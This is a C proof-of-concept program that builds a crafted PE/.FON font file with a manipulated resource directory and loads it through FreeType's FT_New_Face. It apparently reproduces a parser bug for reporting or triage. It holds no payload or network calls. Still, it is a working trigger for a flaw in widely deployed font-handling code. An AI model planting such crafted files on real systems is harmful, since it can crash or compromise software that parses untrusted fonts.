/* PoC: FT_New_Face on a crafted Windows PE (.FON) resource directory.
 *
 * The crafted root resource directory declares number_of_named_entries = 8
 * and number_of_id_entries = 1 (total 9 entries), which is a perfectly
 * well-formed, in-contract directory header.  The file is opened through the
 * public FreeType API (FT_New_Face).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <ft2build.h>
#include FT_FREETYPE_H

static void
put_u16( unsigned char*  p,
         unsigned        v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
}

static void
put_u32( unsigned char*  p,
         unsigned long   v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xFF );
}

int
main( int argc, char** argv )
{
  unsigned char  buf[0x200];
  const char*    path = ( argc > 1 ) ? argv[1] : "/tmp/poc_newbug.fon";
  FILE*          f;

  FT_Library  library;
  FT_Face     face = NULL;
  FT_Error    error;

  memset( buf, 0, sizeof ( buf ) );

  /* MZ header */
  buf[0] = 'M';
  buf[1] = 'Z';
  put_u32( buf + 60, 0x40 );             /* lfanew -> PE header */

  /* PE32 header at 0x40 */
  put_u32( buf + 0x40, 0x00004550 );     /* "PE\0\0" */
  put_u16( buf + 0x44, 0x014C );         /* machine: i386 */
  put_u16( buf + 0x46, 1 );              /* number_of_sections */
  put_u16( buf + 0x54, 0x00E0 );         /* size_of_optional_header */
  put_u16( buf + 0x58, 0x010B );         /* magic32 */
  put_u32( buf + 0xC8, 0x1000 );         /* rsrc_virtual_address */
  put_u32( buf + 0xCC, 0x0200 );         /* rsrc_size */

  /* section header at 0x138 */
  memcpy( buf + 0x138, ".rsrc", 5 );
  put_u32( buf + 0x144, 0x1000 );        /* virtual_address (== rsrc VA) */
  put_u32( buf + 0x148, 0x0200 );        /* size_of_raw_data */
  put_u32( buf + 0x14C, 0x0160 );        /* pointer_to_raw_data */

  /* root resource directory at 0x160 */
  put_u16( buf + 0x16C, 8 );             /* number_of_named_entries */
  put_u16( buf + 0x16E, 1 );             /* number_of_id_entries */

  /* 9 directory entries at 0x170 (name, offset); all zero is fine */

  f = fopen( path, "wb" );
  if ( !f )
  {
    perror( "fopen" );
    return 2;
  }
  fwrite( buf, 1, sizeof ( buf ), f );
  fclose( f );

  error = FT_Init_FreeType( &library );
  if ( error )
  {
    fprintf( stderr, "FT_Init_FreeType failed: 0x%x\n", error );
    return 2;
  }

  error = FT_New_Face( library, path, 0, &face );
  fprintf( stderr, "FT_New_Face returned 0x%x\n", error );

  if ( face )
    FT_Done_Face( face );
  FT_Done_FreeType( library );

  return 0;
}
